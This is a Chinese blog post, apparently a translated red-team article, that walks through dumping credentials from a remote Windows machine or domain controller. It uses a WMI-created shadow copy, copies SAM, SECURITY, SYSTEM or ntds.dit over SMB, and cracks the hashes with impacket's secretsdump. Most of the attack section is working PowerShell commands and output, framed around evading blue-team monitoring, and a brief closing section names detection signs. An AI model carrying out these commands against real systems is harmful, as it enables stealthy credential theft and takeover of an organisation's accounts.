@@ -1,0 +1,114 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="2540f473ecaee7372886b1e0c8c784e1">BiuBiuBiu</h1>
+<blockquote>
+<p>几十年没更新了QAQ<br/>
+翻译下bitsadmin的文章,我只知道他开发的工具ztmd.</p>
+</blockquote>
+<p>帮他的github打个广告:<br/>
+<img src="https://i.loli.net/2020/05/29/6q8MNJAE2vQdLbp.jpg"/></p>
+<pre><code>https://github.com/bitsadmin/wesng/ 提权辅助脚本
+ https://github.com/bitsadmin/fakelogonscreen/ 伪造系统登录页面</code></pre>
+<p><img src="https://i.loli.net/2020/05/29/FLOEiUmvrs34H76.jpg"/></p>
+<h2 data-content="1" id="06c052582e7cebbb9d0d6537f62b2041">正文</h2>
+<p>最近，我们开展了一次红队行动，我们想从远程主机中转储凭据。我们拿到了目标机的管理员权限,希望拿到更多的凭据。 我们认为蓝队正在密切地观察环境，所以这需要以最隐秘的方式进行，并且最好仅涉及到本机Windows工具。 最后我们想出以下方法来获取远程系统的信息:<br/>
+使用WMI和SMB从<code>%SystemRoot%\System32\Config</code>里面拿到这三个文件</p>
+<ul>
+<li>SYSTEM</li>
+<li>SECURITY</li>
+<li>SAM</li>
+</ul>
+<p>也可以使用此方法从域控中获取ntds.dit文件，就能获得整个组织的凭据。</p>
+<h2 data-content="1" id="a41587c809a0726d94eddb75f00163d3">前提条件</h2>
+<p>在本文中，我们将先使用WMI在远程系统上创建一个卷影副本，然后使用SMB从卷影副本下载凭据文件。 假设以下端口</p>
+<ul>
+<li>445 / TCP（SMB）</li>
+<li>135 / TCP（DCOM）</li>
+<li>5985 / TCP（WinRM）</li>
+<li>5986 / TCP（基于SSL的WinRM）</li>
+</ul>
+<p>其中之一是可访问的，并且我们在目标上有管理访问权限。<br/>
+那么我们将使用使用端口135 / TCP进行通信的DCOM。 此外，当前的PowerShell实例在受害主机<code>（DC01.mydomain.local）</code>上以管理访问权限的用户身份运行，以用于获取本地凭据。</p>
+<h2 data-content="1" id="a04a23a1c203b58754f8cb56bd8127ae">什么是WMI?</h2>
+<p>算了,不介绍了.</p>
+<h2 data-content="1" id="0392f46285bcf32c5fb9a10f2c058d54">建立Session</h2>
+<p>如果你是在域外的机器上进行攻击,或者你想使用其他的凭据去访问目标时,建议使用<code>runas.exe</code>在运行远程主机上运行pwsh,这样一来,powershell实例需要认证时,都可以用runas实现.</p>
+<pre><code>runas.exe /netonly /user:MyDomain\MyUser powershell.exe</code></pre>
+<p>启动PowerShell之后，我们首先通过DCOM与远程主机启动一个新的CIM会话，并将其存储在<code>$s</code>变量中。 如果要改用WinRM，请省略<code>New-CimSession cmdlet</code>的<code>-SessionOption</code>参数。</p>
+<pre><code>PS C:\&gt; $h = 'DC01.mydomain.local'
+PS C:\&gt; $so = New-CimSessionOption -Protocol Dcom
+PS C:\&gt; $s = New-CimSession -ComputerName $h -SessionOption $so</code></pre>
+<h2 data-content="1" id="8ab2a9a8b144c766d1186586a1cf1d89">创建卷影</h2>
+<p>建立会话后，我们将调用<code>Win32_ShadowCopy</code>--WMI类 的Create函数，该函数提供Volume参数来创建Windows安装驱动器的卷影副本，其中包含我们要获取的文件。 执行后，<code>Return Value</code>为0表示卷影副本创建成功。 基于<code>ShadowID</code>，我们可以获取卷影副本的所有详细信息。 创建新卷影副本的另一种方法是检查是否已经有（最新）卷影副本，在这种情况下，您可以简单地使用该卷影副本并继续进行下一步。 这可以通过不使用<code>-Filter</code>参数而执行下面的<code>Get-CimInstance cmdlet</code>来完成。</p>
+<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="err">:</span><span class="p">\&gt;</span> <span class="nv">$r</span> <span class="p">=</span> <span class="nb">Invoke-CimMethod</span> <span class="n">-ClassName</span> <span class="n">Win32_ShadowCopy</span> <span class="n">-MethodName</span> <span class="n">Create</span> <span class="n">-Arguments</span> <span class="p">@{</span><span class="n">Volume</span><span class="p">=</span><span class="s1">'C:\'</span><span class="p">}</span> <span class="n">-CimSession</span> <span class="nv">$s</span>
+<span class="n">PS</span> <span class="n">C</span><span class="err">:</span><span class="p">\&gt;</span> <span class="nv">$r</span> <span class="p">|</span> <span class="n">fl</span>
+
+
+<span class="n">ReturnValue</span>    <span class="err">:</span> <span class="n">0</span>
+<span class="n">ShadowID</span>       <span class="err">:</span> <span class="p">{</span><span class="n">B15008D8</span><span class="p">-</span><span class="n">0C63</span><span class="p">-</span><span class="n">468C-AED7-ED4DB0CFD082</span><span class="p">}</span>
+<span class="n">PSComputerName</span> <span class="err">:</span> <span class="n">DC01</span><span class="p">.</span><span class="n">mydomain</span><span class="p">.</span><span class="n">local</span>
+
+
+<span class="n">PS</span> <span class="n">C</span><span class="err">:</span><span class="p">\&gt;</span> <span class="nv">$c</span> <span class="p">=</span> <span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">Win32_ShadowCopy</span> <span class="n">-CimSession</span> <span class="nv">$s</span> <span class="n">-Filter</span> <span class="s2">"ID=</span><span class="se">`"</span><span class="p">$(</span><span class="nv">$r</span><span class="p">.</span><span class="n">ShadowID</span><span class="p">)</span><span class="se">`"</span><span class="s2">"</span>
+<span class="n">PS</span> <span class="n">C</span><span class="err">:</span><span class="p">\&gt;</span> <span class="nv">$c</span>
+
+
+<span class="n">Caption</span>            <span class="err">:</span>
+<span class="n">Description</span>        <span class="err">:</span>
+<span class="n">InstallDate</span>        <span class="err">:</span> <span class="n">4</span><span class="p">/</span><span class="n">19</span><span class="p">/</span><span class="n">2020</span> <span class="n">9</span><span class="err">:</span><span class="n">34</span><span class="err">:</span><span class="n">01</span> <span class="n">PM</span>
+<span class="n">Name</span>               <span class="err">:</span>
+<span class="n">Status</span>             <span class="err">:</span>
+<span class="n">ClientAccessible</span>   <span class="err">:</span> <span class="n">True</span>
+<span class="n">Count</span>              <span class="err">:</span> <span class="n">1</span>
+<span class="n">DeviceObject</span>       <span class="err">:</span> <span class="p">\\?\</span><span class="n">GLOBALROOT</span><span class="p">\</span><span class="n">Device</span><span class="p">\</span><span class="n">HarddiskVolumeShadowCopy6</span>
+<span class="n">Differential</span>       <span class="err">:</span> <span class="n">True</span>
+<span class="n">ExposedLocally</span>     <span class="err">:</span> <span class="n">False</span>
+<span class="n">ExposedName</span>        <span class="err">:</span>
+<span class="n">ExposedPath</span>        <span class="err">:</span>
+<span class="n">ExposedRemotely</span>    <span class="err">:</span> <span class="n">False</span>
+<span class="n">HardwareAssisted</span>   <span class="err">:</span> <span class="n">False</span>
+<span class="n">ID</span>                 <span class="err">:</span> <span class="p">{</span><span class="n">B15008D8</span><span class="p">-</span><span class="n">0C63</span><span class="p">-</span><span class="n">468C-AED7-ED4DB0CFD082</span><span class="p">}</span>
+<span class="n">Imported</span>           <span class="err">:</span> <span class="n">False</span>
+<span class="n">NoAutoRelease</span>      <span class="err">:</span> <span class="n">True</span>
+<span class="n">NotSurfaced</span>        <span class="err">:</span> <span class="n">False</span>
+<span class="n">NoWriters</span>          <span class="err">:</span> <span class="n">True</span>
+<span class="n">OriginatingMachine</span> <span class="err">:</span> <span class="n">DC01</span><span class="p">.</span><span class="n">mydomain</span><span class="p">.</span><span class="n">local</span>
+<span class="n">Persistent</span>         <span class="err">:</span> <span class="n">True</span>
+<span class="n">Plex</span>               <span class="err">:</span> <span class="n">False</span>
+<span class="n">ProviderID</span>         <span class="err">:</span> <span class="p">{</span><span class="n">B5946137</span><span class="p">-</span><span class="n">7B9F</span><span class="p">-</span><span class="n">4925-AF80</span><span class="p">-</span><span class="n">51ABD60B20D5</span><span class="p">}</span>
+<span class="n">ServiceMachine</span>     <span class="err">:</span> <span class="n">DC01</span><span class="p">.</span><span class="n">mydomain</span><span class="p">.</span><span class="n">local</span>
+<span class="n">SetID</span>              <span class="err">:</span> <span class="p">{</span><span class="n">083BBDBA</span><span class="p">-</span><span class="n">4517</span><span class="p">-</span><span class="n">45A2-A62E</span><span class="p">-</span><span class="n">3F52020BC47C</span><span class="p">}</span>
+<span class="n">State</span>              <span class="err">:</span> <span class="n">12</span>
+<span class="n">Transportable</span>      <span class="err">:</span> <span class="n">False</span>
+<span class="n">VolumeName</span>         <span class="err">:</span> <span class="p">\\?\</span><span class="n">Volume</span><span class="p">{</span><span class="n">482bdb36</span><span class="p">-</span><span class="n">8a72</span><span class="p">-</span><span class="n">40a4</span><span class="p">-</span><span class="n">9b12</span><span class="p">-</span><span class="n">912d2783ef39</span><span class="p">}\</span>
+<span class="n">PSComputerName</span>     <span class="err">:</span> <span class="n">DC01</span><span class="p">.</span><span class="n">mydomain</span><span class="p">.</span><span class="n">local</span>
+</pre></div>
+<h2 data-content="1" id="dbc1ddf8a6c5031a30298d428ae95b61">获得凭证文件</h2>
+<p>我们希望从<code>SMB共享</code>中复制文件，不仅是从<code>C $</code>共享中复制文件，而且要从我们创建的特定卷影副本中复制文件。 在Windows资源管理器中，卷影副本也称为<code>以前的版本</code>，可以通过打开某个文件夹的属性，然后导航到<code>“以前的版本”</code>选项卡来列出它们。 这些早期版本也可以从命令行访问，命令行是以<code>@</code>符号开头的某种格式的日期。 基于<code>$ c</code>变量中存储的卷影副本，我们将在以下PowerShell命令行中复制文件的路径。</p>
+<pre><code>PS C:\&gt; $p = '\\{0}\C$\{1}\Windows\System32\config' -f $h,$c.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
+PS C:\&gt; $p
+\\DC01.mydomain.local\C$\@GMT-2020.04.19-19.34.01\Windows\System32\config</code></pre>
+<p>编译路径后，我们将使用复制命令将目标文件复制到本地磁盘（在本例中为C:\tmp）。 由于尝试从卷影副本路径复制文件时创建卷影副本可能会花费一些时间，因此将导致错误提示，即该路径不存在。 在这种情况下，请稍等，然后重试。 如果要从域控中获取密码哈希，也可以使用此方法从（默认情况下）<code>％SystemRoot％\ NTDS</code>文件夹中远程获取ntds.dit文件。</p>
+<pre><code>PS C:\&gt; copy $p\SYSTEM C:\tmp
+PS C:\&gt; copy $p\SECURITY C:\tmp
+PS C:\&gt; copy $p\SAM C:\tmp</code></pre>
+<p>然后关闭连接</p>
+<pre><code>PS C:\&gt; $c | Remove-CimInstance
+PS C:\&gt; $s | Remove-CimSession</code></pre>
+<h2 data-content="1" id="377e26bf4c3c7a4c0281f4285ec390c5">hash破解</h2>
+<p>使用impacket即可</p>
+<h3 data-content="1" id="057ca4f94d445dc65e295cdd259aeb99">SAM</h3>
+<pre><code>secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL</code></pre>
+<h3 data-content="1" id="01811b2cd73804f53cddeb58d0d50714">ntds.dit</h3>
+<pre><code>secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL</code></pre>
+<p>在线破解hash即可</p>
+<h2 data-content="1" id="fce5fcb24d0671b7bc4bcaa49b196eeb">如何发现这种攻击?</h2>
+<ul>
+<li>查看主机日志,出现事件ID 7036，表明已启动Microsoft软件卷影复制提供程序服务</li>
+<li>主机之间的RPC / DCOM和SMB网络异常连接通常无法通信</li>
+</ul>
+<h2 data-content="1" id="e5c09dc31e87d66f300310a15d297ba6">最后</h2>
+<p>由于蓝方会越来越注重监视系统网络以及机器本身上的活动，所以红队更多地倾向于使用Windows本机管理工具来进行攻击。 该攻击表明，使用WMI和SMB，您可以在PowerShell中完美地做到这一点.</p>
+<p><a href="https://bitsadm.in/blog/extracting-credentials-from-remote-windows-system" target="_blank">原文链接</a></p>
+</div>
+</div>
